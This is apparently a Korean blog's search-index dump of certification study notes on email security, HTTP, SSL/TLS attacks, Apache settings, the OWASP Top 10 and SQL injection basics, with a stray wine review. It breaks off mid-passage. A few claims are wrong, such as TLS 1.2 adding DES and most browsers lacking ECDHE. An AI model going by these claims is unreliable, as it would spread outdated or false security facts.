Pretty Good Privacy            분산화된 키 인증       구현 용이       현실적 (현재 많이 사용)       전자서명 제공       기밀성 : 대칭블록암호       ZIP 압축 기능       전자우편 호환성, 단편화           S/MIME (RSA Data Security 개발)            (Secure) / MIME 기반 (Multipurpose Internet Mail Extention)                    이메일은 ASCII 기반으로 전송           첨부파일 등 바이너리 데이터를 ASCII (텍스트) 전환, 전송하는 프로토콜                       다양한 상용 툴킷       X.509 인증서 지원           PGP 보안기술     기밀성 (메시지 암호화)            메시지 암호화 : 3DES, IDEA, CAST-128 - 대칭키 알고리즘       세션키 암호화 : RSA - 공개키(서명, 메시지암호화) 알고리즘           인증 (전자서명)            암호화 : RSA, DSS - 공개키(서명, 메시지암호화) 알고리즘       해시함수 메시지 다이제스트 : SHA-1, MD5, RIPE-MD/160 - 해시 알고리즘           압축 (ZIP)            ZIP 메시지 압축 - 압축 알고리즘       서명 후 암호화 전에 압축                    암호화된 결과를 이용해서 평문 추측을 어렵게 하기 위함                           전자우편 호환성            Radix-64 를 이용해 ASCII 부호로 변환       PGP 결과로 나오는 메시지블록은 8bit 스트림       기존의 이메일에서 ASCII 문장으로 이루어진 블록만을 사용       Base-64 + 오류검출 (Radix-64) 변환을 이용해서 3개의 8Bit 를 4개의 ASCII 문자로 변환           단편화/재조합            fragmentation / reassembly       전자메일의 최대 길이 : 보통 50,000 Byte       50,000 Byte 이상 메시지는 단편화 전송       단편화 과정 : Radix-64, Base-64       수신 측에서는 모든 전자메일 헤더 제거 후 블록 재조립           PGP 에서 사용하는 키            세션키                    하나의 메시지에 대해서 암호화/복호화할 때 사용           예측할 수 없는 키값                       공개키                    사용자는 공개/개인키 쌍을 여러 개 보관 가능                       개인키                    사용자는 공개/개인키 쌍을 여러 개 보관 가능                       패스워드 기반의 대칭키                    저장한 개인키를 암호화                       키 식별자                    누구의 공개키인지 확인 필요                       키 링                    각 사용자들은 개인키링, 공개키링을 갖는다           개인키 링 : 자신의 개인키/공개키 쌍들을 저장           공개키 링 : 자신이 알고 있는 다른 사용자들의 공개키 저장                           과정                                세션키 생성 (의사난수생성기)                                           수신자의 공개키로 세션키 암호화 (비대칭키 알고리즘) -&gt; 암호화된 세션키                                           메시지 압축                                           메시지 암호화 (세션키 이용 : 대칭키 알고리즘) -&gt; 암호화된 메시지                                           암호화된 세션키, 암호화된 메시지 결합 (2진데이터)                                           Radix-64(Base-64 + Data 오류검출) 변환 (ASCII 데이터) -&gt; 송신 데이터                           Open PGP 인증서 사용   S/MIME 보안기술     전송할 수 있는 데이터 형식            SMTP 형식 (RFC 822) 기반                    Date, From, Subject, To, CC, …                       실행파일 (전송불가) -&gt; MIME 타입으로 변환           MIME 타입            RFC 822 헤더                    Date, From, Subject, To, CC, …                       MIME 헤더                    MIME Version : 전자메일 메시지가 MIME 표준           Content-Type : 메시지 유형이 Text, audio, image …                            text/plaintext, img/jpeg(sub-type) …                                   Content-Transfer-Encoding : 인코딩 방식                            base 64, radix 64 …                                               Body           보안기술 (S/MIME Application 이용하여 MIME 타입을 S/MIME 변환)            디지털 서명 : RSA / SHA-256       메시지 암호화 : AES       압축기능 : 제한 없음       이메일 호환성 : Radix-64           S/MIME 데이터를 SMTP 로 송/수신   메시지 구성            Enveloped Data (동봉된 데이터) - 메시지 비밀성을 위함                    임의의 타입의 데이터의 암호화된 내용           하나 이상의 다수 수신자를 포함한 암호화 키                       Signed Data (서명된 데이터)                    내용, 서명을 서명자의 개인키로 암호화           Radix-64 변환한 내용                            S/MIME 기능을 가진 수신자만 내용을 볼 수 있음                                               Clear-Signed Data                    디지털 서명만을 Base-64 변환                            S/MIME 기능이 없더라도 메시지 내용을 볼 수 있음                                               Signed and Enveloped Data                    암호화 메시지는 서명, 서명된 메시지는 암호화                           X.509 V3 인증서 사용   스팸메일의 기술적 대응 방안     메일서버 수신 차단            콘텐츠 필터링                    헤더 정보 확인           제목 확인           메시지 내용 확인                       송신자 필터링 - 지속적 관리 (스팸 블랙리스트 관리) 필요                    IP           메일주소           URL 정보                       네트워크 레벨 필터링                    패킷필터링           DNS 변경                       발송량 기준 차단                    최대 수신용량 관리 / 차단                       시간대별 차단                    송신자 정보 기준 업무시간 외 메일 차단                           메일 서버 보안            릴레이 스팸 방지                    외부에서 전송된, 자신의 메일서버를 통해 다른 메일서버로 전송하려는 메일들 차단           송신자별 릴레이 허용 - DB 설정           Domain 리스트 설정                       Anti-SPAM 솔루션 도입           메일 클라이언트 보안            콘텐츠 필터링       송신자 필터링           스팸 필터 솔루션            메일 서버 앞단 (F/W와 IPS 장비 뒤) 에서 필터링       프락시 메일서버로 동작       필터링 종류                    메일헤더           제목           본문           첨부파일                           스팸 블랙리스트 기법 (Tool)            RBL (Real-time Black List) : 실시간 차단                    IP 관련 Black List DB                       SPF (Sender Policy Framework) : 메일서버 등록제, 메일 검증 기술                    메일해더의 발송지 IP 가 실제 서버인지 확인 (Spoofing 확인)           메일서버를 DNS 에 미리 등록           등록된 서버로부터 발송이 되었는지 확인 / 차단           포털업체에서 송신측 메일서버를 DNS 에 넣고 관리 -&gt; 확인 / 차단                       procmail                    sendmail (unix SMTP 프로토콜 프로그램 - MTA) 과 연동하여 사용 (.cf 파일 - config)           받은 메일 제목 / 내용의 특정 키워드로 필터링           메일 사이즈, 첨부 파일명에 따라 메일 반송           메일 반송/차단 로그분석                       sanitizer                    procmail 의 룰셋           파일 확장자 필터링           메일 내 매크로 검사 기능                       spamAssassin                    Apache 오픈소스 프로젝트           Perl 언어 사용           헤더 / 본문의 정해진 규칙으로 검색           여러가지 기술의 이용이 가능 (RBL - 스팸 데이터베이스 와 협동적 연계)           베이지안 필터링 이용           스코어링을 통해 특정 점수를 넘으면 스팸으로 판단                       inflex                    로컬이나 외부로 나가는 이메일 검사           첨부파일에 대한 필터링 (inbound / outbound)                           유닉스 환경의 메일 프로그램            sendmail - SMTP (MTA)       Dovecot - POP3, IMAP (MAA)           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-Email/",
        "teaser": null
      },{
        "title": "정보보안 - HTTP",
        "excerpt":"Web 보안     웹프로토콜인 HTTP, TCP/IP 가 데이터에 대한 보안서비스를 제공하지 않음   웹트래픽 보안     IPSec            네트워크 계층에서 사용           SSL/TLS            범용 해결방안       전송계층에서 사용           S/MIME, Kerveros            응용계층에서 사용           HTTP 프로토콜     비연결형 프로토콜 (Connectionless Protocol)            Connection : Close 방식의 프로토콜 (1.0)                    과정                            웹브라우저에서 연결 요청 - 예 : index.php               TCP 연결설정 (3Way handshake)               HTTP 요청 Msg 전송               HTTP 응답 MSg 수신               TCP 연결종료 (4Way handshake)               반복…                                   제한된 서버의 연결자원을 최대한 활용하기 위함                       Connection : Keep Alive 방식의 프로토콜 (1.1)                    Request 헤더에 Connection:Keep-Alive 옵션 추가           웹 서버에 연결을 유지할 시간을 설정           과정                            웹브라우저에서 연결 요청 - 예 : index.php               TCP 연결설정 (3Way handshake)               HTTP 요청 Msg 전송               HTTP 응답 MSg 수신               반복…               일정 시간 경과 후               TCP 연결종료 (4Way handshake)                                   TCP 연결설정 / 연결종료 의 서버부하를 줄이기 위함                           Stateless 프로토콜            상태정보를 유지하지 않는 프로토콜                    요청 상태정보를 가지고 있지 않음           현재 요청 상태정보도 가지고 있지 않음           현재 요청과 이전 요청을 구분하여 식별하지 않음                           HTTP 상태정보 유지기술     쿠키(Cookie) 방식            과정                    Client : (Web Browser) 웹서버에 HTTP 요청           Server : 클라이언트 식별을 위한 쿠키 생성           Server : HTTP 응답 (Response Header 내 Set-Cookie: id:test1234)           Client : HTTP 요청 (Request Header 내 Cookie: id:test1234)                       쿠키 지속시간에 따른 분류                    영속쿠키 : 파일에 쿠키정보 저장           세션쿠키 : 클라이언트 메모리 상에 세션 (연결)이 유지되는 동안 저장, 웹브라우저 종료시 쿠키 소멸                           세션(Session) 방식            과정                    Client : (Web Browser) 로그인 요청 (test1234)           Server : test1234의 세션객체 (#235@$r324) 생성 (timeout 값 설정 - 일정시간 요청없으면 소멸)           Server : HTTP 응답 (Response Header 내 Set-Cookie : session-id:#235@$r324)           Client : 웹브라우저 메모리에 세션쿠키값 저장           Client : Action (예: A상품 2개 선택) &gt; (Request Header 내 Cookie:session-id:#235@$r324)           Client : Action (예: B상품 10개 선택) &gt; (Request Header 내 Cookie:session-id:#235@$r324)           Server                            SessionID : #235@$r324                                    ID : test1234                   name : ABC                   …                   cart list                                            A : 2                       B : 10                                                                                                                       쿠키 방식보다 안전       Session Hijacking 공격 : SessionID 탈취           HTTP 쿠키(Cookie) 보안속성            서버에서 응답할 때 사용       httponly : XSS (Cross Site Script) 공격 대비                    세션쿠키 탈취 방지           Web Server 에서 Client (Web Browser) 에 Header (Set-cookie: {sessionID}; HttpOnly;) 를 전송                            웹브라우저 스크립트에서 Set-cookie 에 접근하는 것을 금지                                               secure                    Set-cookie 에 설정           평문값 대신 암호화된 값을 전송           Header (Set-cookie:{sessionID}; secure;)                           HTTP 메시지 구성     HTTP 요청 메시지            구문형식 : 요청라인, 요청헤더, 빈라인(Empty line), 요청 메시지 바디                    Request Line : {Method} {URI} {HTTP버전} CRLF                            HEAD0x20/index.jsp0x20HTTP/1.00x0d0a                                   Request Header : {헤더명}:{헤더값}; …; CRLF                            Host : 요청 대상 서버의 호스트/도메인명, 포트정보               User-Agent : 클라이언트의 어플리케이션/OS 정보               Refer : 현재 요청한 URL 정보를 가지고 있는 이전 문서(URL)의 정보                                   Empty Line : CRLF           Body : {Msg 내용}                            GET 인 경우 Message Body 없음                                               헥사값                    Space : 0x20           CRLF : 0x0d0a                       요청메소드 : GET, POST, HEAD, OPTIONS, CONNECT, PUT (PUSH X), TRACE, DELETE                    GET                            Query String                                    GET 은 Query String 을 이용하여 제한된 Data 를 전송 (URL 길이 한계)                   http://server[:port]/path/program?query_string                                            ? : 쿼리스트링 식별자                       query string : param1=value1&amp;param2=value2&amp;param3=value3                                                    &amp; : 파라미터 구분자                           % : 문자열을 16진수로 표현                                                                                                                                       GET 방식은 Query String 이 모두 노출되어 POST 에 비해 취약               access_log에 query string 기록됨                                   POST                            Body 부분을 이용하여 긴 Data 를 전송                                   HEAD                            GET 과 유사, 서버 응답 시 Body 제외하고 Header 부분만 전송               요청에 대한 처리는 서버에서 진행이 됨               URL 링크 유효성 검증을 위해 사용                                    Req : HEAD index.jsp HTTP/1.0                   Res :                                            Date:Thu 20 June 2018                       Server:Apache/... PHP                       Content-Type:text/html                       Connection:close                                                                                                           OPTIONS                            서버가 지원하는 메소드를 확인하는 용도                                    Req : OPTIONS * HTTP/1.0 : URI를 지정하지 않는다.                   Res :                                            HTTP/1.1 200 OK                       Date:...                       Server:Apache...                       Content-Length:0                       Allow:GET,HEAD,TRACE : 지원하는 메소드                       Connection:close                                                                                                           CONNECT                            클라이언트와 서버 간의 터널링 목적               웹 서버가 Proxy 역할을 함                                   PUT                            Body 에 Data 를 담아 전송               요청 URI 에 저장                                   TRACE                            클라이언트로부터 수신한 메세지를 서버에서 그대로 리턴               루프백 테스트 용도                                   DELETE                            요청 URI 자원 삭제                                                   HTTP 응답 메시지            구문형식                    상태라인                            HTTP/1.1 200 OK                                    HTTP 버전                   상태코드                   응답구문                   CRLF                                                                   응답 헤더                            Date:Thu 20 June 2018               Server:Apache/... PHP               Cache-Control:...               Content-Type:text/html : Msg Body 의 데이터 형식               Content-Length:30 : Msg Body 의 데이터 길이                                    헤더명:헤더값;속성;속성CRLF                   …                   헤더명:헤더값CRLF                                                                   빈 라인 (Empty)                            CRLF                                   응답 메시지 바디                            메시지 내용                                               상태코드 : 1xx, 2xx, 3xx, 4xx, 5xx                    1xx : 정보 제공                            100 : continue (첫 메시지 도착, 클라이언트는 계속 요청이 가능)               101 : switching (서버의 업그레이드 헤더에 정의되어 있는 프로토콜을 변환시키기 위한 클라이언트의 요청을 수락)                                   2xx : 성공                            200 : Success               201 : Created (PUT 메소드에 의해서 서버에 파일이 정상 생성됨)               202 : Accepted (요청을 수락함, 바로 실행시키지는 않음)               204 : No Content (Msg Body 에 내용이 없음)                                   3xx : Redirection - 요청자원의 위치 재지정                            301 : Moved Permanently (요청된 URL 이 영구적으로 변경됨)               302 : Moved Temporarity = Found (요청된 URL 이 임시적으로 변경됨)               304 : Not Modified (변경이 되지 않았으니 캐시를 사용해 접속)                                   4xx : 클라이언트 에러                            400 : Bad Request (요청 메시지 문법 오류)               401 : Unauthorized (요청 메시지 인증 부족)               403 : Forbbiden (요청 자원에 대한 접근 차단)               404 : Not Found (요청 자원이 없음)                                   5xx : 서버 에러                            500 : Internal Server Error (내부적 서버 오류-프로그램장애 or 메시지손상)               501 : Not implemented (요청된 메소드 수행 불가)               503 : Service Unavailable (서비스 거부상태)                                                   예시            요청                    GET /test/sample.php HTTP/1.1           Host:www.test.com                       응답                    HTTP/1.1 302 Found : 요청 자원 위치가 임시적 변경 (Moved Temporarity)           Location:http://www.test.com/test/example.php : 클라이언트 재요청수행                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-HTTP/",
        "teaser": null
      },{
        "title": "정보보안 - HTTP",
        "excerpt":"Web 보안     웹프로토콜인 HTTP, TCP/IP 가 데이터에 대한 보안서비스를 제공하지 않음   웹트래픽 보안     IPSec            네트워크 계층에서 사용           SSL/TLS            범용 해결방안       전송계층에서 사용           S/MIME, Kerveros            응용계층에서 사용           SSL/TLS     개요            전송 계층의 보안 프로토콜       기밀성 (DES, RC4 와 같은 대칭키 알고리즘 / 비밀키 : Handshake Protocol) , 무결성 (MAC Code), 인증 보안 서비스 (공개키 인증서) 를 제공       Netscape 사에서 제안한 웹브라우저를 위한 보안프로토콜       1996년 SSL 3.0 발표       2014년 SSL 3.0 이 Puddle 공격에 취약점이 발견되어 안전하지 않은 것으로 판명       1999년 IETF(국제 인터넷 표준화 기구) 에서 TLS1.0 버전 발표       2006년 TLS1.1 (RFC 4346) , AES 암호화 지원       TLS1.2 (RFC 5246),DES 암호화 지원           구조            Application Layer 와 Transport Layer 사이에 SSL/TLS Layer 가 존재       TCP 기반       상태 정보를 유지하는 프로토콜       암호화 / 복호화 진행       Application Layer : HTTP       SSL / TLS Layer                    Handshake / Change Cipher Spec / Alert / Application Data           Record                            Application Data : 응용계층에 있는 데이터 전달               Handshake : 양 종단 간 보안 파라미터 협상을 위한 프로토콜               Change Cipher Spec : 협상된 보안파라미터의 적용, 변경을 알림               Alert : SSL / TLS 통신 중 오류가 발생하면 통보               Record : 적용, 변경된 보안파라미터를 이용하여 암호화/복호화/압축/해제/무결성보호 기능 제공                                               Transport Layer : TCP           상태정보 유지 프로토콜            세션 상태정보                    Full Handshake (완전협상) 이후 세션 생성                       SSL / TLS 연결 (Connection) 상태정보                    Abbreviated Handshake (단축협상)                       완전협상에 의해 세션을 생성하고, 세션정보 기반 단축협상을 하여 Connection 생성                    완전협상 (Session)                            SessionID (32bit) : 100               암호화정보 : AES256/CBC (Cipher suit 중 선택)               Master Secret : Hash (서버랜덤값(32byte), 클라이언트랜덤값(32byte), premaster secret)                                   단축협상 (Connection) &amp; Data 송수신                            SessionID : 100               Key Block : Hash (서버랜덤값, 클라이언트랜덤값, Master Secret)               Key Block : 아래의 값들을 생성하는데 이용                                    Client Write Key : 암호화 비밀키 (서버 Read Key)                   Server Write Key : 암호화 비밀키 (클라이언트 Read Key)                   Client Mac Key : MAC 생성 시 사용하는 인증키                   Server Mac Key : MAC 생성 시 사용하는 인증키                   Client IV : 블록 암호화에 사용하는 초기벡터값                   Server IV : 블록 암호화에 사용하는 초기벡터값                                                                               세션이 유지되는 동안 다수의 Connection 이 생성됨           완전협상 (Full Handshake)            과정                    Client –&gt; Server : Client Hello                            클라이언트가 지원 가능한 SSL/TLS 버전               Cipher Suites (암호화 도구들)               압축방식               Client Random (난수 28바이트 + Datetime 4바이트)               Session ID (빈 값) : Session ID Length:0               Cipher Suites (지원 가능한 Cipher Suite 목록)                                    Cipher Suites (10 suites)                                            Cipher suite: TLS_DHE_RSA_with_AES_256_CBC_SHA                                                    DHE : (Ephermeral Diffie Hellman) 임시디피헬먼                           ECDHE : (Elliptic Curve + DHE) 타원곡선암호 + 임시디피헬먼                           DH : Diffie Hellman                                                                       Cipher suite: …                       …                                                           Cipher Suite 란?                                            키 교환 및 인증 알고리즘 필드                       Cipher Spec (암호명세) 필드 (블록암호화모드,HMAC용 해시알고리즘)                                                    SSL_TLS_키교환및인증_with_암호명세                           TLS_RSA_with_AES_256_CBC_SHA256                                                            키교환및인증 : RSA                               대칭 암호화 알고리즘 : AES                               암호키길이 : 256bit                               블록암호화모드 : CBC                               HMAC용 해시알고리즘 : SHA256                                                                                   TLS_DHE_DSS_with_AES_256_GCM_SHA256                                                            키교환 / 인증 : DHE (E:임시 Diffie Hellman (익명X)) / DSS                               대칭 암호화 알고리즘 : AES                               암호키길이 : 256bit                               블록암호화모드 : GCM                               HMAC용 해시알고리즘 : SHA256                                                                                                                                                                                                                   Client &lt;– Server : Server Hello                            SSL/TLS 버전               Cipher Suite (클라이언트 암호화 도구들 중 택1)               압축방식               Server Random (난수 28바이트 + Datetime 4바이트)               Session ID (생성 값) : Session ID Length : 32                                   Client &lt;– Server : Server Certificate (Optional)                            서버 인증서 목록                                    Certificates                                            Certificate Length : …                       Certificate ID : …                       Certificate Length : …                       Certificate ID : …                                                                                                           Client &lt;– Server : Server Key Exchange (Optional)                            키 교환 필요 시 키 교환에 필요한 정보를 서명값과 함께 전송                                   Client &lt;– Server : Certificate Request (Optional)                            클라이언트 인증서 요청 메시지               서버에서 인증 가능한 인증기관목록 전송                                   Client &lt;– Server : Server Hello Done                            Server Hello 종료 알림 메시지                                   Client –&gt; Server : Client Certificate (Optional)                            클라이언트 인증서 목록 전달 (요청시)                                   Client –&gt; Server : Client Key Exchange                            키 교환에 필요한 premaster secret 값 생성하여 전달               암호화 방식에 따라 전달하는 값이 달라짐                                   Client –&gt; Server : Certificate Verify (Optional)                            인증서에 대한 증명 메시지               클라이언트가 보낸 인증서에 대한 개인키를 가지고 있음을 증명 (요청시)                                   Client –&gt; Server : Change Cipher Spec                            협상한 암호명세 적용/변경함을 알려줌                                   Client –&gt; Server : Finished                            협상 완료 메시지                                   Client &lt;– Server : Change Cipher Spec                            협상한 암호명세 적용/변경함을 알려줌                                   Client &lt;– Server : Finished                            협상 완료 메시지                                   Application Data 를 주고 받음 (단축협상이 이루어진 이후)                           단축협상 (Abbreviated Handshake)            과정                    Client –&gt; Server : Client Hello                            Session ID                                    Session ID Length : 32                   Session ID : …                                               Client Random               Cipher Suites               압축 방식                                   Client &lt;– Server : Server Hello                            Server Random               Session ID                                    Session ID Length : 32                   Session ID : …                                               Cipher Suite                                   Client &lt;– Server : Change Cipher Spec (완전 협상과의 차이점)                            Content-Type : Change Cipher Spec(20)                                                Client &lt;– Server : Finished                       Client –&gt; Server : Change Cipher Spec                        Client –&gt; Server : Finished                       Data 송수신                       SSL/TLS 계층 중 Record 계층에 대해서…                    아래 과정 진행 후 송수신                            메시지 압축               압축해제               무결성 검증               암호화 / 복호화                                   과정                            Application Data 를 단편화               단편화 한 데이터를 압축 + MAC 추가 =&gt; 암호화               전송                                                   공격 및 대응            SSL/TLS 공격                    OPENSSL 의 HeartBleed 취약성                            2014년 Google 에서 발견               HeartBeat Protocol 이란?                                    HandShake / ChangeCipherSpec / Alert / ApplicationData                                                                                                                                                            Application Data                               HeartBeat 로 나눠짐                                                                                                                                                                   네트워크 상에서 컴퓨터와 네트워크 간 정상동작을 나타내기 위해 사용                   네트워크 상 동기화를 위한 주기적인 신호                   보조서버, 주서버 동기화 시 HeartBeat 가 없으면 서버 간 재연결 시도                                               Alert Protocol (2바이트)                                    Level (1바이트) / Alert (1바이트)                                               OpenSSL 사용 시, HeartBeat 프로토콜의 요구 데이터 길이에 대한 점검이 이루어지지 않아 메모리의 관계없는 데이터까지 상대에게 넘어가는 취약점               대응책                                    SSL 버전 업 (1.0.1g 이상)                   HeartBeat 확장 기능을 사용하지 않는 옵션 (재컴파일 필요)                   인증서 재발급                                                                   SSL 3.0 취약성 (POODLE 공격)                            공격자가 TLS1.0 에서 SSL3.0 으로 다운그레이드 강요 요청               이후 MITM (중간자공격) 진행하여 암호화되어있는 쿠키, 데이터 추출               SSL 3.0 은 블록암호화 모듈 CBC 사용                                    패딩된 암호 블록이 MAC 에 의해 보호되지 않는 취약점이 존재                                               대응책                                    SSL 3.0 을 사용하지 않음                                                                   FREAK 공격 (수출용 RSA 키의 소인수 분해 로 다운그레이드)                            프랑스 국립연구소 2015년 발견               중간자 공격을 이용, SSL 을 통해 강제로 RSA 인증 (취약) 을 사용하도록 함                                    RSA Export Suite : 512 비트 -&gt; 약한 암호화                                               대응책                                    최신 Open SSL 사용                                                                   완전 순방향 비밀성 (PFS, Perfect Forward Secrecy)                            SSL/TLS 통신 중 서버의 개인키 노출문제                                    키교환 RSA 방식 중 MITM 공격을 통해 트래픽을 가로채고, 서버의 개인키를 이용하여 세션키, 비밀키, 송수신 데이터 복호화                   노출된 인증서를 폐기하여도, 이전 트래픽은 복호화 가능                                               완전 순방향 비밀성 : 이전 트래픽 정보의 기밀성이 유지됨                                    키 교환시마다 새로운 DH 개인키를 생성                                            DHE (Ephermeral Diffie-Hellman) 이용하여 생성                       premaster secret (서버,클라이언트 공통) 생성                       서버 개인키는 DH의 파라미터를 인증하는 용도로만 사용                                                                                       PFS 적용의 어려움                                    DH 키 교환방식은 RSA 에 비해서 속도가 느림                                            서버에서 DHE, ECDHE cipher suite 를 비활성화하는 경우가 많음                       대부분의 웹 브라우저가 DHE, ECDHE 를 지원하지 않음                                                                                                                          ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-SSL_TLS/",
        "teaser": null
      },{
        "title": "정보보안 - HTTP",
        "excerpt":"Web 보안   HTTPS     개요            SSL을 이용한 HTTP (https://...)       http 는 80 포트, https 는 443 포트       기밀성, 클라이언트와 서버간 인증, 무결성 기능 제공       암호화                    요청문서 URL           문서내용           브라우저 입력 양식 내용           쿠키           HTTP 헤더 내용                       스니핑이 어렵지만, 사용자 입력 값에 대한 검증이 어렵다.           S-HTTP     개요            Secure-HTTP : EIT 에 의해 1994년 정의된 프로토콜       SSL과 다르게 HTTP 메시지가 암호화되어 TCP/IP 망을 통해 전송 (shttp://)       HTTP 메시지 캡슐화 (암호화), 헤더 추가 (메시지형식, 부호화 방식)           과정            웹 클라이언트에서 HTTP 메시지를 암호화하여 SHTTP 메시지로 변환       웹 클라이언트에서 서버로 전송       웹 서버에서 SHTTP 메시지를 복호화 하여 HTTP 메시지로 변환           특징            HTTP 트랜잭션의 특징 (요청-응답) 을 유지       협상을 통해 암호화 방식 등을 결정 가능           IIS     자원 권한설정 (파일, 폴더)            읽기, 쓰기, 실행 기능 부여 / 회수                    예 : Upload 폴더에 실행권한을 부여 -&gt; Webshell 실행 위험                           관리자 페이지 접근통제            무작위 공격 (Brute Force) 에 노출될 수 있음       관리자 권한 획득 관련 취약점 노출될 가능성이 있음       관리자 페이지 접근 IP 설정 필요           메소드 제한 (GET, POST) 설정            DELETE, HEAD, PUT 등등의 메소드는 제한하는 것이 좋음       확장 매핑 메뉴 -&gt; 제한 입력창에 기록           헤더정보 숨김            서버의 헤더정보를 이용해 취약점 공격이 가능       어드민 등록정보에 http 헤더를 입력하여 설정           httpd.conf (Apache 보안 설정 파일)     자원 권한설정 (파일, 폴더)   관리자 페이지 접근통제            &lt;Directory \"/var/www/html/admin\"&gt;           메소드 제한 (GET, POST) 설정            &lt;LimitExcept GET POST&gt;                    order allow, deny           Deny from all                       &lt;/LimitExcept&gt;           헤더정보 숨김   옵션 설명            ServerType : (standalone, inetd)                    standalone : 사용자 요청을 웹데몬이 받음           inetd, xinetd : 사용자 요청을 수퍼데몬이 받음                       User nobody, Group nobody                    User, Group 설정 지시자는 홈페이지 서비스를 직접 담당하는 Apache 의 자식 프로세스들의 실행소유자, 소유그룹을 어떤 게정에 부여할 것인지를 결정           보안을 위해 nobody 로 설정                       Options : 지정한 디렉토리 이하에 모든 파일, 디렉토리에 적용할 접근제어 설정                    디렉토리 목록을 보여줄지, CGI를 허용할 것인지 등등의 것들을 설정           -index : 디렉토리 목록을 보여주지 않음           -FollowSymlinks : 심볼릭링크를 허용하지 않음 : 링크파일의 경로까지 확인할 가능성이 있음                       ServerSignature : (On, Off)                    서버 배너 정보의 노출 여부           Off 로 설정하여 서버 정보를 숨김                       ServerTokens : (Prod, Min, OS, Full)                    서버 정보표시 제한           Prod : ProductOnly -&gt; 웹서버의 종류만을 표시           Min : Minimal -&gt; 웹서버 종류와 버전정보 표시           OS : 웹서버 종류, 버전, OS 정보 표시           Full : 웹서버 종류, 버전, OS 정보, 설치 모듈 표시                           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-IIS_Httpd_conf/",
        "teaser": null
      },{
        "title": "정보보안 - OWASP10 (2019)",
        "excerpt":"Web 보안   웹 서비스 공격     웹서비스 공격            최신 해킹 경향 (새로운 공격 기법 발견)       OWASP 10 : 3년마다 10 개의 주요 취약점 발표           사용자 PC(컴퓨터) 공격            Client 취약점           웹서버 공격            웹 서버 취약점       F/W 필터링을 통과하여 내부 네트워크 공격           OWASP 10 (Open Web Application Security Project) (2017)     A1. Injection            종류                    SQL Injection           OS Injection           LDAP Injection           XPath Injection           NoSQL Injection                       보호                    Injection 탐지                            SQL Injection 탐지               명령어 Injection 탐지                                                   A2. 취약한 인증 (Broken Authentication)            개요                    해커가 암호나 키 (PW키, 세션토큰, 쿠키) 를 악용하여 사용자 신원을 가장                       보호                    쿠키 탐지 : 쿠키 위조여부                           A3. 민감한 정보 노출            개요                    중요한 데이터 (개인식별정보, 신용카드정보, 개인신원정보 등) 의 보호나 암호화가 부족                       보호                    SSL : Https           개인정보 유출 탐지, 차단, 마스킹                           A4. XML 외부 개체            개요                    XML 프로세서가 오래된 경우 혹은 잘못된 설정이 되어있는 경우           XML 문서 내에서 외부개체를 사용할 경우 발생하는 취약점                            파일URI핸들러               내부파일 공유               포트스캔               원격코드실행                                   DoS 공격이나 내부정보 유출 가능성이 있음                           A5. 취약한 접근 통제            개요                    인증된 사용자의 접근권한 (작업에 대한 제한) 이 잘못 설정되어 있는 경우                           A6. 잘못된 보안설정            개요                    애플리케이션 서버, 프레임워크, 웹서버, DB서버, S/W 보안설정 정의필요           소프트웨어 최신상태 유지                       보호                    디렉토리 목록 숨김           오류페이지 숨김           악성파일 업로드 탐지           기본페이지 접근 탐지 : HTTP 요청 Data 검사                           A7. 크로스 사이트 스크립팅 (XSS)            개요                    어플리케이션이 신뢰할 수 없는 데이터를 가져와서 제대로 된 승인 없이 웹브라우저에 전송           Stored XSS           DOM XSS           Reflect XSS           브라우저에서 스크립트를 실행해 세션 탈취           악의적인 내용을 실행해 웹 사이트 훼손                       보호                    XSS 탐지 : HTTP 요청 데이터 검사                           A8. 불안전한 역직렬화            개요                    원격 코드 실행           공격 재생           Injection           권한상승 공격                           A9. 취약점이 있는 컴포넌트 사용            개요                    컴포넌트 라이브러리, 소프트웨어 모듈 등에 의한 취약점의 증가                       보호                    애플리케이션 취약점 탐지 : HTTP 요청 데이터 검사           취약점이 잘 알려진 컴포넌트를 사용하지 않음                           A10. 불충분한 로깅 &amp; 모니터링            개요                    사고 대응에 대한 대응책 미비           불충분한 환경이 지속될 경우 내부 탐지 불가, 침해 탐지도 오래 걸림                           ","categories": ["IS_Certification"],
        "tags": ["정보보안기사","어플리케이션"],
        "url": "https://bluesplatter.com/is_certification/IS-Application-OWASP10/",
        "teaser": null
      },{
        "title": "APOTHIC RED 아포틱 레드 (2019)",
        "excerpt":"1. 구매정보     빈티지 : 2019   가격 : 15000 원   구매처 : 영등포 롯데백화점   2. 비비노      링크없음   2. 감상     1일차            블렌디드 레드 와인       단 맛, 끈적끈적한 느낌       마치 포트와인 같은 느낌 (물리는 맛)           3. 총점     2.5/5  ","categories": ["Wine"],
        "tags": ["와인"],
        "url": "https://bluesplatter.com/wine/Wine_Apothic_Red/",
        "teaser": null
      },{
        "title": "정보보안 - SQL Injection",
        "excerpt":"SQL Injection   SQL Injection     개요            코드 인젝션의 한 기법으로 클라이언트의 입력값을 조작하여 서버의 데이터베이스 공격                    예) 웹페이지 로그인 폼의 ID/PW 입력란에 SQL 쿼리를 삽입                       공격이 쉬운데 비해 파괴력이 강하기 때문에 시큐어코딩의 기본중 하나       Injection 계열 취약점들은 테스트를 통한 발견은 어려우나 스캐닝툴이나 코드 검증절차를 거치면 보통 쉽게 발견되기 때문에 탐지하기 쉬운 편                    스캐닝 툴                            Nikto : GNU 오픈소스, 웹서버, Injection 등 취약점 점검               SQLMap (Python) : 블라인드 SQL Injection 점검               Absinthe : 블라인드 SQL Injection 점검                                               입력 값 필터링이 제대로 이루어지지 않는 경우 발생           Web Application 의 일반적인 인증 절차            ID/PW 입력       SQL Query 생성       Database 에 쿼리 전송       Database 에서 쿼리 실행           공격방식에 따른 분류            Form SQL Injection                    구조                            HTML                       &lt;form&gt;           &lt;input /&gt;           &lt;submit&gt;       &lt;/form&gt;                                               웹서버                                    PHP, JSP, ASP 처리                   쿼리문 생성                   WHERE 절을 TRUE 로 만든다 (공격예시)                                               DB                                   주석처리문자                            MySQL : # , MSSQL : –, ORACLE : –                                   URL 인코딩 (%xx 로 표기, xx 는 16진수)                            # -&gt; %23               - -&gt; %2D               ' -&gt; %27               = -&gt; %3D               공백 -&gt; + 혹은 %20               널문자 -&gt; %00               ; -&gt; %3B                      